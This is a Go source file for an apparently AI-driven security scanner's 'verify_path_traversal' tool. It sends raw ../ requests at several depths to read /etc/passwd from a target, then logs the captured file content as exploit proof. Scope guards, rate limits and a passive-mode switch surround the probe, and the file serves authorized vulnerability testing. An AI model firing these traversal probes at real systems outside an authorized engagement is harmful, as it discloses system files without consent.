package agent

import (
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/xalgord/xalgorix/v4/internal/scanctx"
	"github.com/xalgord/xalgorix/v4/internal/scopeguard"
	"github.com/xalgord/xalgorix/v4/internal/tools"
	"github.com/xalgord/xalgorix/v4/internal/tools/httpclient"
)

// verify_path_traversal confirms a path-segment file read without relying on
// an HTTP CLI's default URL normalization. The caller supplies a candidate
// directory, not a product-specific CVE or a prewritten payload. The verifier
// sends a missing-file baseline and a bounded set of raw ../ paths, accepting
// only recognizable /etc/passwd content absent from the baseline.
func (a *Agent) registerVerifyPathTraversalTool(reg *tools.Registry) {
	reg.Register(&tools.Tool{
		Name:        "verify_path_traversal",
		Description: "Deterministically CONFIRM path-segment traversal/local file read on a candidate file-serving directory. Give a url such as https://target/assets/plugin/ (or a ledger hypothesis_id). It sends a missing-file baseline and raw ../ requests at bounded depths without normalizing the path, then confirms only if /etc/passwd-style content appears in a probe but not the baseline. On success it records the actual request and response in the ledger. Report as CWE-22 using that output. Uses scan auth, honors rate limits, never follows redirects, and is disabled in passive mode. Use this before giving up on a traversal lead that ordinary curl may have normalized; for manual curl requests use --path-as-is.",
		Parameters: []tools.Parameter{
			{Name: "url", Description: "Absolute URL or path of the candidate directory (for example /assets/plugin/). Supply this or hypothesis_id.", Required: false},
			{Name: "hypothesis_id", Description: "Ledger hypothesis carrying a candidate directory; used when url is absent.", Required: false},
		},
		Execute: a.verifyPathTraversalTool,
	})
}

func (a *Agent) verifyPathTraversalTool(args map[string]string) (tools.Result, error) {
	l := a.ledger()
	if l == nil {
		return tools.Result{Error: "ledger unavailable in this context"}, nil
	}
	if normalizeActivityMode(a.scanIntensity) == activityModePassive {
		return tools.Result{Error: "verify_path_traversal issues live requests and is disabled in passive scan mode."}, nil
	}
	rawEP := strings.TrimSpace(args["url"])
	baseHint := ""
	if rawEP == "" {
		id := strings.TrimSpace(args["hypothesis_id"])
		if id == "" {
			return tools.Result{Error: "url or hypothesis_id is required"}, nil
		}
		h, ok := l.Get(id)
		if !ok {
			return tools.Result{Error: fmt.Sprintf("unknown hypothesis id %q", id)}, nil
		}
		rawEP, baseHint = strings.TrimSpace(h.Endpoint), strings.TrimSpace(h.Target)
	}
	absURL, err := a.resolveInjectionURL(rawEP, baseHint)
	if err != nil {
		return tools.Result{Error: "verify_path_traversal: " + err.Error()}, nil
	}
	u, err := url.Parse(absURL)
	if err != nil || u.Host == "" || (u.Scheme != "http" && u.Scheme != "https") {
		return tools.Result{Error: "verify_path_traversal: a valid HTTP(S) candidate directory is required"}, nil
	}
	if u.RawQuery != "" || u.Fragment != "" {
		return tools.Result{Error: "verify_path_traversal: pass the candidate directory URL without a query or fragment"}, nil
	}
	if scopeguard.IsLocalOrListener(a.localGuard, u.Host) {
		return tools.Result{Error: fmt.Sprintf("verify_path_traversal refused: %q resolves to the operator's own machine or local network, not the engagement target.", u.Host)}, nil
	}
	if !strings.HasSuffix(u.Path, "/") {
		u.Path += "/"
		u.RawPath = ""
	}
	baseURL := u.String()
	headers := a.probeAuthHeaders()
	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	baselineURL := baseURL + "xalgorix-missing-" + strconv.FormatInt(time.Now().UnixNano(), 36)
	baseline, err := httpclient.SendRaw(httpclient.RawRequest{
		Method: "GET", URL: baselineURL, Headers: headers,
		FollowRedirects: false, TimeoutSec: 30,
	})
	if err != nil {
		return tools.Result{Error: fmt.Sprintf("verify_path_traversal: baseline request failed: %v", err)}, nil
	}
	for _, depth := range []int{2, 4, 8} {
		if stop := a.injectionRateGate(); stop != "" {
			return tools.Result{Error: stop}, nil
		}
		probeURL := baseURL + strings.Repeat("../", depth) + "etc/passwd"
		probe, probeErr := httpclient.SendRaw(httpclient.RawRequest{
			Method: "GET", URL: probeURL, Headers: headers,
			FollowRedirects: false, TimeoutSec: 30,
		})
		if probeErr != nil {
			return tools.Result{Error: fmt.Sprintf("verify_path_traversal: depth-%d request failed: %v", depth, probeErr)}, nil
		}
		if !pathTraversalLeakVerdict(string(baseline.Body), string(probe.Body)) {
			continue
		}

		excerpt := boundedText(string(probe.Body), 600)
		endpoint := u.EscapedPath()
		confirm := fmt.Sprintf("Path traversal/local file read CONFIRMED at %s (CWE-22): a raw depth-%d ../ request returned /etc/passwd-style content absent from the missing-file baseline.", endpoint, depth)
		proof := fmt.Sprintf("Baseline GET %s → HTTP %d; no passwd content.\nProbe GET %s → HTTP %d; response excerpt:\n%s", baselineURL, baseline.StatusCode, probeURL, probe.StatusCode, excerpt)
		h := l.Upsert(scanctx.Hypothesis{
			Title:      "Path traversal at " + endpoint,
			VulnClass:  "lfi",
			Endpoint:   endpoint,
			Target:     baseURLOf(u),
			Confidence: 0.95,
			Status:     scanctx.HypothesisTesting,
			Origin:     "verify_path_traversal",
			NextAction: "Report the confirmed local file read as CWE-22 with the captured response as proof, then link the finding via add_hypothesis_evidence(kind=finding_ref).",
		})
		l.AddEvidence(h.ID, scanctx.Evidence{
			Kind:       "exploit",
			Summary:    confirm,
			Request:    "GET " + probeURL,
			Response:   excerpt,
			Confidence: 0.95,
			AgentID:    a.ledgerOrigin(),
			Source:     "verify_path_traversal",
		})
		// A baseline-vs-probe differential containing captured /etc/passwd data
		// is deterministic exploitation proof. Mark it proven immediately so the
		// finish gate keeps the scan alive until this evidence is reported.
		a.settleVerifierHypothesis(l, h.ID, true, "raw traversal request returned captured local-file content")
		return tools.Result{
			Output:   confirm + fmt.Sprintf(" Recorded captured evidence in ledger %s. Call report_vulnerability now with severity=high, cwe_id=CWE-22, target=%s, endpoint=%s, method=GET, verification_method=data_extracted, hypothesis_id=%s, and exploitation_proof copied from the captured request/response below. Do not infer further file contents.\n\n%s", h.ID, baseURLOf(u), probeURL, h.ID, proof),
			Metadata: map[string]any{"path_traversal_confirmed": true, "endpoint": endpoint, "hypothesis_id": h.ID, "depth": depth},
		}, nil
	}
	return tools.Result{
		Output:   fmt.Sprintf("Path traversal NOT confirmed at %s: none of the raw depth-2/4/8 requests returned recognizable /etc/passwd content absent from the baseline. Do not report this probe as a finding; investigate a different directory or file-read mechanism.", u.EscapedPath()),
		Metadata: map[string]any{"path_traversal_confirmed": false, "endpoint": u.EscapedPath()},
	}, nil
}

func pathTraversalLeakVerdict(baseline, probe string) bool {
	return !looksLikeFileLeak(baseline, "/etc/passwd") && looksLikeFileLeak(probe, "/etc/passwd")
}
